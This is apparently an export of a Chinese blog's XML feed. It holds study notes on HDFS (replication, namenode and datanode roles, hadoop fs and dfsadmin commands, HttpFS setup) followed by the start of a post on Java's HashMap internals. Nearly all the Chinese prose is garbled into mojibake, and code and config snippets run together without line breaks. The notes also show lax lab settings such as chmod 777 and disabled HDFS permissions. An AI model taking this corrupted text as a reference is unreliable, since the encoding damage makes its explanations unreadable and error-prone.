hadoop2.x ä¸­é»˜è®¤çš„åˆ‡åˆ†çš„å—çš„å¤§å°æ˜¯: 128M, 1.xä¸­é»˜è®¤çš„æ˜¯64M å¦‚æœä¸€ä¸ªæ–‡ä»¶ä¸è¶³128M, ä¹Ÿä¼šå•ç‹¬å­˜ä¸€ä¸ªå¿«, å¿«çš„å¤§å°å°±æ˜¯å­˜å‚¨æ•°æ®çš„å®é™…å¤§å° è¿™ä¸ªåˆ†å—å­˜å‚¨æ€æƒ³ä¸­, å¦‚æœä¸€ä¸ªå—çš„å­˜å‚¨èŠ‚ç‚¹å®•æœºäº†, è¿™ä¸ªæ—¶å€™, æ•°æ®çš„å®‰å…¨æ€§å¾—ä¸åˆ°ä¿è¯äº† HDFSä¸­é»˜è®¤å—çš„å­˜å‚¨é‡‡ç”¨å¤‡ä»½æœºåˆ¶ é»˜è®¤çš„å¤‡ä»½ä¸ªæ•°æ˜¯3ä¸ª(æ€»å…±å­˜çš„, å­˜åˆ°datanodeä¸Šçš„, namenodeä¸å­˜), ä¹‹å‰è‡ªå·±é…çš„æ˜¯2ä¸ª, æ‰€æœ‰å¤‡ä»½ç›¸åŒåœ°ä½æ˜¯ç›¸åŒçš„. ç›¸åŒçš„æ•°æ®å—çš„å¤‡ä»½ä¸€å®šå­˜å‚¨åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Š å¦‚æœèŠ‚ç‚¹æ€»å…±2ä¸ª, dfs.replication=3 å‰¯æœ¬ä¸ªæ•°æ˜¯3ä¸ª, å®é™…å­˜å‚¨2ä¸ª, å¦ä¸€ä¸ªè¿›è¡Œè®°è´¦, å½“é›†ç¾¤èŠ‚ç‚¹ä¸ªæ•°å¤§äº3ä¸ªæ—¶, ä¼šå¤åˆ¶è¿™ä¸ªå‰¯æœ¬, æœ€ç»ˆè¾¾åˆ°3ä¸ª å‡è®¾é›†ç¾¤ä¸­çš„èŠ‚ç‚¹4ä¸ª, å‰¯æœ¬3ä¸ª, æœ‰ä¸€ä¸ªå‰¯æœ¬çš„æœºå™¨å®•æœºäº†, è¿™ä¸ªæ—¶å€™å‘ç°å‰¯æœ¬çš„ä¸ªæ•° å°äº è®¾å®šçš„ä¸ªæ•°, å°±ä¼šè¿›è¡Œå¤åˆ¶, è¾¾åˆ°3ä¸ªå‰¯æœ¬, å¦‚æœ è¿™ä¸ªæ—¶å€™, åˆšæ‰å®•æœºçš„èŠ‚ç‚¹åˆæ¢å¤äº†, è¿™ä¸ªæ—¶å€™é›†ç¾¤å‰¯æœ¬ä¸ªæ•°ä¸º4äº†, é›†ç¾¤ä¼šç­‰å¾…ä¸€æ®µæ—¶é—´, å¦‚æœå‘ç°è¿˜æ˜¯4ä¸ª, å°±ä¼šåˆ é™¤ä¸€ä¸ªå‰¯æœ¬, è¾¾åˆ°3ä¸ª(è®¾å®šå€¼) å¤‡ä»½è¶Šå¤šè¶Šå¥½å—? ç†è®ºä¸Šå‰¯æœ¬æ•°è¶Šå¤š, æ•°æ®å®‰å…¨æ€§è¶Šé«˜ ä½†æ˜¯å‰¯æœ¬æ•°è¶Šå¤š, ä¼šå ç”¨è¿‡å¤šçš„å­˜å‚¨èµ„æº, ä¼šé€ æˆé›†ç¾¤çš„ç»´æŠ¤å˜å¾—è¶Šå›°éš¾ 100 ä¸ªèŠ‚ç‚¹, 50ä¸ªå‰¯æœ¬, åœ¨è¿™50ä¸ªå‰¯æœ¬ä¸­, éšæ—¶éƒ½æœ‰å¯èƒ½å®•æœº, hdfså°±éœ€è¦ç»´æŠ¤å‰¯æœ¬ ä¸€èˆ¬æƒ…å†µä¸‹, 3ä¸ªå°±å¯ä»¥äº† hadoopæ˜¯åŸºäºå»‰ä»·çš„pcæœºè®¾è®¡çš„, ä¼šé€ æˆæœºå™¨éšæ—¶å¯èƒ½å®•æœº HDFSçš„ç›®å½•ç»“æ„ hdfsçš„ç›®å½•ç»“æ„ä¸linux æ“ä½œç³»ç»Ÿç±»ä¼¼, ä»¥ /ä¸ºè·ŸèŠ‚ç‚¹, æˆ‘ä»¬å°†è¿™ä¸ªç›®å½•ğŸŒ²ç§°ä¸ºæŠ½è±¡ç›®å½•æ ‘ å› ä¸ºhdfsçš„ç›®å½•ç»“æ„ä»£è¡¨çš„æ˜¯æ‰€æœ‰æ•°æ®èŠ‚ç‚¹çš„æŠ½è±¡å‡ºæ¥çš„ç›®å½•, ä¸ä»£è¡¨ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ hdfs: /hadoop.zip 500M è¢«åˆ†æˆ4ä¸ªå—å­˜å‚¨ hdfsä¸­å­˜å‚¨çš„æ•°æ®å— æ˜¯æœ‰ç¼–å·çš„, blk_1, blk_2, blk_3, blk_4 /spark.zip 300M 3ä¸ªå—, blk_5 blk_6 blk_7 åº•å±‚å­˜å‚¨çš„æ—¶å€™, æ¯ä¸€ä¸ªblockéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„id hdfsçš„æ•°æ®åº•å±‚å­˜å‚¨çš„æ—¶å€™å—, è¿˜æ˜¯å­˜åœ¨çœŸæ­£çš„ç‰©ç†èŠ‚ç‚¹ä¸Š. 2. HDFS çš„æ•´ä½“ç»“æ„ä¸»ä»ç»“æ„: ä¸€ä¸ªä¸»èŠ‚ç‚¹, å¤šä¸ªä»èŠ‚ç‚¹ namenode: ç”¨äºå­˜å‚¨å…ƒæ•°æ®, åŒ…æ‹¬: æŠ½è±¡ç›®å½•æ ‘ å­˜å‚¨æ•°æ®å’Œblockçš„å¯¹åº”å…³ç³» blockå­˜å‚¨çš„ä½ç½® å¤„ç†å®¢æˆ·ç«¯çš„è¯»å†™è¯·æ±‚ è¯»: ä¸‹è½½ å†™: ä¸Šä¼  datanode è´Ÿè´£çœŸæ­£çš„æ•°æ®å­˜å‚¨, å­˜å‚¨æ•°æ®çš„block çœŸæ­£å¤„ç†è¯»å†™ secondarynamenode: å†·å¤‡ä»½èŠ‚ç‚¹: åŠ©ç† å½“namenodeå®•æœºçš„æ—¶å€™, secondarynamenodeä¸èƒ½ä¸»åŠ¨åˆ‡æ¢ä¸º namenode, ä½†æ˜¯ secondarynamenodeä¸­å­˜å‚¨çš„æ•°æ®ä¸namenodeç›¸åŒ. ä¸»è¦ä½œç”¨: namenodeå®•æœºçš„æ—¶å€™, å¸®åŠ©namenodeæ¢å¤ å¸®åŠ©namenodeåšä¸€äº›äº‹æƒ…, åˆ†æ‹…namenodeçš„å‹åŠ› 3. HDFSä¼˜ç¼ºç‚¹: ä¼˜ç‚¹: å¯æ„å»ºåœ¨å»‰ä»·æœºå™¨ä¸Š, æˆæœ¬ä½, é€šè¿‡å¤šå‰¯æœ¬æé«˜å¯é æ€§, æä¾›äº†å®¹é”™å’Œæ¢å¤æœºåˆ¶ é«˜å®¹é”™æ€§ å®¹é”™æ€§: æ•°æ®è®¿é—®ä¸Š, ä¸€ä¸ªèŠ‚ç‚¹æ•°æ®ä¸¢å¤±, ä¸å½±å“æ•´ä½“çš„æ•°æ®è®¿é—® æ•°æ®è‡ªåŠ¨ä¿å­˜å¤šä¸ªå‰¯æœ¬, å‰¯æœ¬ä¸¢å¤±å, è‡ªåŠ¨æ¢å¤, æœ€ç»ˆæ¢å¤åˆ°ç”¨æˆ·é…ç½®çš„å‰¯æœ¬ä¸ªæ•° é€‚åˆæ‰¹å¤„ç†, é€‚åˆç¦»çº¿æ•°æ®å¤„ç† ç§»åŠ¨è®¡ç®—è€Œéæ•°æ®, æ•°æ®ä½ç½®æš´éœ²ç»™è®¡ç®—æ¡†æ¶ é€‚åˆå¤§æ•°æ®å¤„ç† GB, TB ç”šè‡³ PB çº§æ•°æ®, ç™¾ä¸‡è§„æ¨¡ä»¥ä¸Šçš„æ–‡ä»¶æ•°é‡, 10k+ èŠ‚ç‚¹è§„æ¨¡ æµå¼æ–‡ä»¶è®¿é—®, ä¸æ”¯æŒæ•°æ®ä¿®æ”¹, hdfsç”¨äºæ•°æ®å­˜å‚¨ ä¸€æ¬¡æ€§å†™å…¥, å¤šæ¬¡è¯»å–, ä¿è¯æ•°æ®ä¸€è‡´æ€§ ç¼ºç‚¹: ä¸æ”¯æŒä½å»¶è¿Ÿçš„æ•°æ®è®¿é—®, ä¸æ”¯æŒ å®æ—¶/è¿‘å®æ—¶ æ•°æ®è®¿é—®, å› ä¸ºæ¶‰åŠåˆ°å¤šè½®RPCè°ƒç”¨ å‘ NameNode å¯»å€.. æ‹¿åˆ°åœ°å€åï¼Œ å‘ DataNode è¯·æ±‚æ•°æ®.. ä¸æ“…é•¿å­˜å‚¨å¤§é‡çš„å°æ–‡ä»¶â€“kbçº§åˆ«çš„ å¯»å€æ—¶é—´å¯èƒ½å¤§äºè¯»å–æ•°æ®çš„æ—¶é—´, ä¸åˆ’ç®— è¿›è¡Œæ•°æ®è®¿é—®çš„æ—¶å€™å…ˆæ‰¾å…ƒæ•°æ® å…ƒæ•°æ®æ˜¯å’Œblockå¯¹åº”çš„, 1ä¸ªblockå—å¯¹åº”ä¸€æ¡å…ƒæ•°æ® 1000wä¸ª1kbçš„æ–‡ä»¶, å­˜äº†1000wä¸ªå— â€” 1000wå…ƒæ•°æ® åœ¨è¿›è¡Œæ•°æ®è®¿é—®çš„æ—¶å€™å¯èƒ½èŠ±äº† 1s çš„æ—¶é—´, æ€»ä½“ä¸Šä¸åˆ’ç®— è¿™æ ·ä¼šé€ æˆå…ƒæ•°æ®å­˜å‚¨é‡è¿‡å¤§, å¢åŠ namenodeçš„å‹åŠ› åœ¨hdfsä¸­ä¸€èˆ¬æƒ…å†µä¸‹, ä¸€æ¡å…ƒæ•°æ®å¤§å° 150byte å·¦å³ 1000wæ¡å…ƒæ•°æ® â€” 1000w * 150, 1.5Gå·¦å³ ä¸æ”¯æŒæ–‡ä»¶å†…å®¹ä¿®æ”¹, ä»…ä»…æ”¯æŒæ–‡ä»¶æœ«å°¾è¿½åŠ  appendï¼Œ ä¸€ä¸ªæ–‡ä»¶åŒæ—¶åªèƒ½æœ‰ä¸€ä¸ªå†™è€…ï¼Œä¸æ”¯æŒå¹¶å‘æ“ä½œ ==4. HDFS çš„ å¸¸ç”¨å‘½ä»¤:==HDFSå½’æ ¹ç»“åº•å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ, ç±»ä¼¼äº linux, éœ€è¦ç”¨å‘½ä»¤æ¥æ“ä½œ 1. hapdoop fs å‘½ä»¤ hadoop fs / hdfs dfs æ•ˆæœæ˜¯ä¸€æ ·çš„ åœ¨hadoopä¸­æŸ¥çœ‹, åªæœ‰ç»å¯¹è·¯å¾„çš„è®¿é—®æ–¹å¼ æŸ¥çœ‹å¸®åŠ© hadoop fs -help æŸ¥çœ‹æ‰€æœ‰ hadoop fsçš„å¸®åŠ© hadoop fs -help ls æŸ¥çœ‹ fsä¸‹çš„ lsçš„å¸®åŠ© åˆ—å‡ºæ ¹ç›®å½•: hadoop fs -ls / hadoop fs -ls -R / é€’å½’å±•ç¤º hadoop fs -ls -R -h /å‹å¥½å±•ç¤ºï¼Œ å±•ç¤ºæ–‡ä»¶å¤§å°å•ä½ å¦‚æœä¸æŒ‡å®šç›®å½•ï¼Œ ä¼šé»˜è®¤æ‰¾å½“å‰ç”¨æˆ·xxå¯¹åº”çš„/user/xxçš„ç›®å½• é€’å½’åˆ›å»º -mkdir -p: hadoop fs -mkdir -p /aa/bb/cc/dd ä¸åŠ  -p ä¸ºæ™®é€šåˆ›å»º åˆ›å»ºç©ºæ–‡ä»¶-touchz ç±»ä¼¼äº Linux ä¸‹çš„ touch ä¸Šä¼  put: [-put [-f][-p] [-l] &lt;localsrc&gt; ... &lt;dst&gt;] ä¸Šä¼ ä¸€ä¸ª: hadoop fs -put hadoop-2.7.6.tar.gz /ss ä¸Šä¼ å¤šä¸ª: hadoop fs -put aa.txt bb.txt /ss ä¸‹è½½ get hadoop fs -get hdfsè·¯å¾„ æœ¬åœ°è·¯å¾„ åˆå¹¶ä¸‹è½½ getmerge hadoop fs -getmerge /ss/aa.txt /ss/bb.txt /home/ap/cc.txt ä¼šå°†æœ€åä¸€ä¸ªè·¯å¾„ä¹‹å‰8çš„å½“åšéœ€è¦åˆå¹¶çš„æ–‡ä»¶, æœ€åä¸€ä¸ªè·¯å¾„ä¸­æŒ‡å®šçš„æ–‡ä»¶å°±æ˜¯åˆå¹¶ç”Ÿæˆçš„æ–‡ä»¶ æŸ¥çœ‹æ–‡ä»¶å†…å®¹ cat -cat æŸ¥çœ‹æ–‡ä»¶å†…å®¹ -textä¹Ÿæ˜¯ç±»ä¼¼ åˆ é™¤æ–‡ä»¶ rm rm -rf (é”™è¯¯çš„) rm -r(é€’å½’) -f(å¼ºåˆ¶) æ–‡ä»¶hadoop fs -rm -f /ss/aa.txt æ–‡ä»¶å¤¹ hadoop fs -rm -f -r /aa mv ä¿®æ”¹åå­—, ç§»åŠ¨ ç§»åŠ¨çš„æ–‡ä»¶ä» hdfs åˆ° hdfs hadoop fs -mv .. .. cp å¤åˆ¶ hadoop fs -cp /hdfsfile /hdfsfile: ä» hdfs å¤åˆ¶åˆ° hdfs å‚æ•° -p ï¼š å¤åˆ¶åä¿æŒæ–‡ä»¶çš„åŸæœ¬å±æ€§, æ—¶é—´æˆ³ï¼Œ æƒé™ç­‰ Passing -p preserves status [topax] (timestamps, ownership, permission, ACLs, XAttr). å‚æ•° -f : å·²æœ‰åŒåæ–‡ä»¶çš„è¯ï¼Œ ç›´æ¥è¦†ç›– åœ¨æœ«å°¾è¿½åŠ : -appendToFile æœ¬åœ°æ–‡ä»¶ hdfsæ–‡ä»¶` å°†æœ¬åœ°æ–‡ä»¶bb.txt è¿½åŠ åˆ° htfdçš„ /aa/aa.txt ä¸Š hadoop fs -appendToFile aa.txt /ss/bb.txt ä»å‘½ä»¤è¡Œè¿½åŠ  , ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç»“æŸï¼Œ å…ˆå­˜ç–‘ï¼Ÿï¼Ÿ hadoop fs -appendToFile - /a.txt` è¿™ä¸ªè¿½åŠ æ˜¯åœ¨åŸå§‹å—çš„æœ«å°¾è¿½åŠ çš„. ä¼šæ”¹å˜é›†ç¾¤ä¸Šçš„æ–‡ä»¶ å¦‚æœè¶…è¿‡128Mæ‰ä¼šè¿›è¡Œåˆ‡åˆ†, ä½†è¿™ä¸ªå‘½ä»¤ä¸€èˆ¬ä¸ä¼šä½¿ç”¨ æŸ¥çœ‹æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹æ•°é‡ count DIR_COUNT FILE_COUNT CONTENT_SIZE FILE_NAME 8 3 176.5 K /tmp hadoop fs -count -h /tmp: -h æ˜¯å‹å¥½å±•ç¤º hdfs dfs -count -h /tmp: ä¸ä¸Šé¢æ•ˆæœä¸€æ · hdfs dfs -count -q -h /tmp: æŸ¥çœ‹æ–‡ä»¶é…é¢ï¼Œ å…·ä½“çœ‹ help duï¼š å±•ç¤ºæ–‡ä»¶å¤§å°ï¼Œ å¦‚æœå‚æ•°æ˜¯æ–‡ä»¶å¤¹ï¼Œ åˆ™å±•ç¤ºæ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„å¤§å° hadoop fs -du -h /tmp hadoop fs -du -s -h /tmp: s åº”è¯¥æ˜¯ sum çš„æ„æ€ï¼Œ å±•ç¤ºæ‰€æœ‰æ–‡ä»¶å¤§å°çš„æ€»å’Œ å±•ç¤ºæ–‡ä»¶æœ€å1kbå†…å®¹-tail Show the last 1KB of the file. hadoop fs -tail /dd.txt` -f Shows appended data as the file grows. åº”ç”¨åœºæ™¯ï¼š ç›‘æ§æ—¥å¿— ä¿®æ”¹æ–‡ä»¶æƒé™ chmod 12345678910111213141516# 1. ç›´æ¥ä½¿ç”¨åè¿›åˆ¶æ•°å­—ä¿®æ”¹ [ap@cs2]~/test% hadoop fs -ls /drwxr-xr-x - ap supergroup 0 2018-06-01 08:55 /aa# -Rï¼š /aa ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶é€’å½’ä¿®æ”¹æƒé™[ap@cs2]~/test% hadoop fs -chmod -R 777 /aa[ap@cs2]~/test% hadoop fs -ls /drwxrwxrwx - ap supergroup 0 2018-06-01 08:55 /aa# 2. é’ˆå¯¹ç”¨æˆ·ç»„ä¿®æ”¹ï¼Œæ³¨æ„ï¼Œä¿®æ”¹2ä¸ªä¸åŒç»„æƒé™ï¼Œ ç”¨ï¼Œéš”å¼€hadoop fs -chmod u+x,g+x /a.txt # 3. æœ€å¸¸ç”¨çš„æ–‡ä»¶æƒé™ï¼Œ æ˜¯ 644(-rw-r--r--) å’Œ 755(-rwxr-xr-x) æ–‡ä»¶åˆ›å»ºé»˜è®¤å°±æ˜¯644# 4. u+x ä¸ +x çš„åŒºåˆ« å‰è€…æŒ‡å®šåŠ åœ¨å“ªç»„ç”¨æˆ·ä¸Šï¼Œ åè€…æ˜¯æ‰€æœ‰ç»„éƒ½åŠ  ä¿®æ”¹ç”¨æˆ·æƒé™ chown 1hadoop fs -chown -R ç”¨æˆ·å:ç»„å hdfsç›®å½•/æ–‡ä»¶ 2. hdfs dfsadminå‘½ä»¤ ç®¡ç†å‘˜å¯¹å½“å‰èŠ‚ç‚¹çš„ä¸€äº›æ“ä½œ hdfs dfsadmin -report æŠ¥å‘Šå½“å‰çš„ä¸€äº›çŠ¶æ€ -live æ´»è·ƒçš„ -dead æ­»çš„ -decommissioning é€€å½¹çš„ **hdfs dfsadmin -safemode å®‰å…¨æ¨¡å¼ ç³»ç»Ÿåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œ ä¼šæœ‰30ç§’çš„å®‰å…¨æ¨¡å¼å¼€å¯çŠ¶æ€ï¼Œ è¿‡äº†30ç§’å°±å…³äº† enter è¿›å…¥ leave ç¦»å¼€ get æŸ¥çœ‹ hdfs dfsadmin è®¾ç½®é…é¢ -setQuota ï¼š é…é¢æ˜¯é™å®šçš„æ–‡ä»¶&amp;æ–‡ä»¶å¤¹çš„æ•°é‡ A quota of 1 would force the directory to remain empty. ç©ºæ–‡ä»¶æœ¬èº«ç®—ä¸€ä¸ªæ–‡ä»¶ bin/hdfs dfsadmin -setQuota 10 lisi -clrQuota -setSpaceQuotaï¼š ç©ºé—´é…é¢é™å®šçš„æ˜¯å¤§å° bin/hdfs dfsadmin -setSpaceQuota 4k /lisi/ -clrSpaceQuota hdfs dfs -count -q -h /user: åŠ ä¸Š -q æ˜¯æŸ¥çœ‹é…é¢ 3. httpFSè®¿é—®ä½¿ç”¨ REST çš„å½¢å¼ï¼Œ å¯ä»¥åœ¨æµè§ˆå™¨ä¸Šç›´æ¥è®¿é—®é›†ç¾¤ï¼Œ å¯ä»¥åœ¨é Linux å¹³å°è®¿é—® 123456789101112131415161718192021# ç¼–è¾‘æ–‡ä»¶httpfs-env.sh# æ‰“å¼€æ­¤å¥æ³¨é‡Š, ä½¿ç”¨å†…åµŒçš„ tomcatexport HTTPFS_HTTP_PORT=14000# ç¼–è¾‘æ–‡ä»¶core-site.xml&lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.hosts&lt;/name&gt; &lt;value&gt;*&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.groups&lt;/name&gt; &lt;value&gt;*&lt;/value&gt;&lt;/property&gt;ç¼–è¾‘æ–‡ä»¶hdfs-site.xml&lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;é‡æ–°å¯åŠ¨namenodeï¼Œæ‰§è¡Œ sbin/httpfs.sh start# æ‰§è¡Œå‘½ä»¤curl -i "http://cs1:14000/webhdfs/v1?user.name=root&amp;op=LISTSTATUS" æ›´å¤šå‘½ä»¤å‚è€ƒ ç›¸å…³çŸ¥è¯†ç‚¹ è¿™äº›å‘½ä»¤åœ¨é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹éƒ½å¯ä»¥åš, hdfsæ–‡ä»¶ç³»ç»Ÿä¸­, çœ‹åˆ°çš„ç›®å½•ç»“æ„åªæ˜¯ä¸€ä¸ªæŠ½è±¡ç›®å½•, å®é™…å­˜å‚¨åœ¨é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ä¸Š aa.txt , å¤§å°150M, hadoop fs -put aa.txt / ä¼šåœ¨æ ¹ç›®å½•ä¸‹çœ‹åˆ° /aa.txt, ä½†æ˜¯ aa.txt çœŸå®å­˜å‚¨çš„æ—¶å€™, ä¼šå…ˆè¿›è¡Œåˆ†å—, åˆ†2å—, è¿›è¡Œå­˜å‚¨, å‡è®¾é›†ç¾¤ä¸­5ä¸ªå­˜å‚¨èŠ‚ç‚¹, è¿™2ä¸ªå—å­˜å‚¨åœ¨å“ªä¸ªèŠ‚ç‚¹, ç”±namenodeè¿›è¡Œåˆ†é… å›¾å½¢ç•Œé¢ç‚¹è¿›å», å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„å— Linuxçš„æƒé™ç®¡ç†å‘½ä»¤: ä¿®æ”¹ æ–‡ä»¶/æ–‡ä»¶å¤¹ æƒé™çš„ chmod: å¯è¯»: r , =4 å¯å†™: w, =2 å¯æ‰§è¡Œ: x, =1 æœ€å¤§æƒé™æ˜¯7 -rw-rw-râ€“ æ–‡ä»¶å±æ€§ d:ç›®å½• -:æ–‡ä»¶ l:é“¾æ¥ ç¬¬ä¸€ç»„: æœ¬ç”¨æˆ·, ç¬¬äºŒç»„: æœ¬ç»„ç”¨æˆ·, ç¬¬ä¸‰ç»„: å…¶å®ƒç”¨æˆ· chmod 711 æ”¹ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶æƒé™ä¸º711 chmod -R 711 ç›®å½• ä¿®æ”¹æ–‡ä»¶æ‰€å±ç”¨æˆ·å’Œç»„ chown chown -R root:root ss/æŠŠssçš„æ–‡ä»¶å¤¹å…¨éƒ¨æ”¹æˆrootç”¨æˆ·å’Œrootç»„ 5ã€EclipseæŸ¥çœ‹Hadoopæ–‡ä»¶ä¿¡æ¯è¯¦æƒ…å¯ä»¥æŸ¥çœ‹ å…¶ä¸­å¯èƒ½é‡åˆ°çš„bugï¼Œå‚è§ å…¶ä¸­ï¼Œ Eclipseç«¯æ— æ³•ç›´æ¥åˆ é™¤æ–‡ä»¶çš„é—®é¢˜ï¼Œä¼¼ä¹å¯ä»¥é€šè¿‡åœ¨hdfs-site.xml ä¸­ä¿®æ”¹è®¿é—®æƒé™æ¥å®ç°ï¼Œ è¿˜æœªå°è¯• 1234&lt;property&gt; &lt;name&gt;dfs.permissions&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; 6. é€šè¿‡ Java APIçš„æ–¹å¼æ“ä½œ HDFS]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashMapçš„å®ç°åŸç†]]></title>
    <url>%2F2018%2F06%2F02%2FJava%2FMyStudy%2FHashMap%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.ä»€ä¹ˆæ˜¯HashMap Hash: æ•£åˆ—å°†ä¸€ä¸ªä»»æ„çš„é•¿åº¦é€šè¿‡æŸç§(hashå‡½æ•°)ç®—æ³•è½¬æ¢æˆä¸€ä¸ªå›ºå®šå€¼ Map: åœ°å›¾, (x,y)å­˜å‚¨ åº•å±‚å°±æ˜¯ä¸€ä¸ªæ•°ç»„ç»“æ„, æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹åˆæ˜¯ä¸€ä¸ªé“¾è¡¨, å½“æ–°å»ºä¸€ä¸ªHashMapçš„æ—¶å€™, å°±ä¼šåˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„ æ€»ç»“: é€šè¿‡ hash å‡ºæ¥å€¼, ç„¶åé€šè¿‡å€¼å®šä½åˆ°æŸä¸ª map, ç„¶åvalue å­˜å‚¨åˆ°è¿™ä¸ª mapä¸­, valueåªä¸è¿‡æ˜¯ key çš„é™„å±. 2.æºç åˆ†æå…ˆç»™å‡ºç»“è®ºæ•°æ®ç»“æ„: åº•å±‚æ˜¯æ•°ç»„ Entry å°±æ˜¯æ•°ç»„ä¸­çš„å…ƒç´  æ¯ä¸ªMap.Entryå…¶å®å°±æ˜¯ä¸€ä¸ªkey-valueå¯¹, å®ƒæŒæœ‰ä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨Entry&lt;K,V&gt; next;, è¿™å°±æ„æˆäº†é“¾è¡¨ å­˜å–å®ç°: å­˜å‚¨put : è¿‡ç¨‹ å…ˆæ ¹æ® key çš„ hashCode é‡æ–°è®¡ç®— hash å€¼, æ ¹æ® hash å€¼å¾—åˆ°è¿™ä¸ªå…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®(ä¸‹æ ‡) å¦‚æœæ•°ç»„è¯¥ä½ç½®ä¸Šå·²ç»å­˜æ”¾æœ‰å…¶ä»–å…ƒç´ äº†, é‚£ä¹ˆåœ¨è¿™ä¸ªä½ç½®ä¸Šçš„å…ƒç´ å°†ä»¥é“¾è¡¨çš„å½¢å¼å­˜æ”¾, æ–°åŠ å…¥çš„æ”¾åœ¨é“¾å¤´, æœ€å…ˆåŠ å…¥çš„æ”¾åœ¨é“¾å°¾. å¦‚æœæ•°ç»„è¯¥ä½ç½®ä¸Šæ²¡æœ‰å…ƒç´ , å°±ç›´æ¥å°†è¯¥å…ƒç´ æ”¾åˆ°æ•°ç»„ä¸­çš„è¯¥ä½ç½®ä¸Š. æ³¨æ„ç‚¹ å½“ç³»ç»Ÿå†³å®šå­˜å‚¨ HashMap ä¸­çš„ key-value å¯¹æ—¶ï¼Œå®Œå…¨æ²¡æœ‰è€ƒè™‘ Entry ä¸­çš„ valueï¼Œä»…ä»…åªæ˜¯æ ¹æ® keyæ¥è®¡ç®—å¹¶å†³å®šæ¯ä¸ªEntryçš„å­˜å‚¨ä½ç½®ã€‚å½“ç³»ç»Ÿå†³å®šäº† keyçš„å­˜å‚¨ä½ç½®ä¹‹åï¼Œvalueéšä¹‹ä¿å­˜åœ¨é‚£é‡Œå³å¯ã€‚ å¯¹äºäºä»»æ„ç»™å®šçš„å¯¹è±¡ï¼Œåªè¦å®ƒçš„ hashCode()è¿”å›å€¼ç›¸åŒï¼Œé‚£ä¹ˆç¨‹åºè°ƒç”¨ hash(int h)æ–¹æ³•æ‰€è®¡ç®—å¾—åˆ°çš„hash ç å€¼æ€»æ˜¯ç›¸åŒçš„ã€‚ æœ¬è´¨ä¸Šå°±æ˜¯æŠŠ hash å€¼å¯¹æ•°ç»„é•¿åº¦å–æ¨¡è¿ç®—ï¼Œ è¿™æ ·ä¸€æ¥ï¼Œå…ƒç´ çš„åˆ†å¸ƒç›¸å¯¹æ¥è¯´æ˜¯æ¯”è¾ƒå‡åŒ€çš„ ä½†æ˜¯ç³»ç»Ÿæ˜¯ç”¨çš„ä½è¿ç®—ï¼Œ æ–¹æ³•æ›´å·§å¦™ï¼Œ æ¶ˆè€—æ›´å° è¯»å–get è¿‡ç¨‹ é¦–å…ˆè®¡ç®— key çš„ hashCodeï¼Œæ‰¾åˆ°æ•°ç»„ä¸­å¯¹åº”ä½ç½®çš„æŸä¸€å…ƒç´ ï¼Œç„¶åé€šè¿‡key çš„ equals æ–¹æ³•åœ¨å¯¹åº”ä½ç½®çš„é“¾è¡¨ä¸­æ‰¾åˆ°éœ€è¦çš„å…ƒç´ ã€‚ å­˜å‚¨å®ç°æ€»ç»“: HashMap åœ¨åº•å±‚å°† key-value å½“æˆä¸€ä¸ªæ•´ä½“è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ª Entry å¯¹è±¡ã€‚ HashMap åº•å±‚é‡‡ç”¨ä¸€ä¸ª Entry[] æ•°ç»„æ¥ä¿å­˜æ‰€æœ‰çš„ key- value å¯¹ï¼Œå½“éœ€è¦å­˜å‚¨ä¸€ä¸ª Entry å¯¹è±¡æ—¶ï¼Œä¼šæ ¹æ® hash ç®—æ³•æ¥å†³å®šå…¶åœ¨æ•°ç»„ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œåœ¨æ ¹æ® equals æ–¹æ³•å†³å®šå…¶åœ¨è¯¥æ•°ç»„ä½ç½®ä¸Šçš„é“¾è¡¨ä¸­çš„å­˜å‚¨ä½ç½®ï¼› å½“éœ€è¦å–å‡ºä¸€ä¸ª Entry æ—¶ï¼Œä¹Ÿä¼šæ ¹æ® hash ç®—æ³•æ‰¾åˆ°å…¶åœ¨æ•°ç»„ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œå†æ ¹æ® equals æ–¹æ³•ä»è¯¥ä½ç½®ä¸Šçš„é“¾è¡¨ä¸­å–å‡ºè¯¥ Entryã€‚ 3. HashMap çš„æ€§èƒ½å‚æ•°123456789101112131415161718192021222324252627282930313233343536/** * æ¡¶è¡¨é»˜è®¤å®¹é‡ 16, å¿…é¡»æ˜¯ 2 çš„å€æ•°ï¼Œ ä¾¿äºåé¢çš„ ä½è¿ç®— * æ§åˆ¶hashcode ä¸è¶…16èŒƒå›´, a.hashcode = xx % 16 (hashcode å–æ¨¡ æ¡¶ä¸ªæ•°) */static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16/** * MUST be a power of two &lt;= 1&lt;&lt;30. * æ¡¶è¡¨æœ€å¤§ 2^30 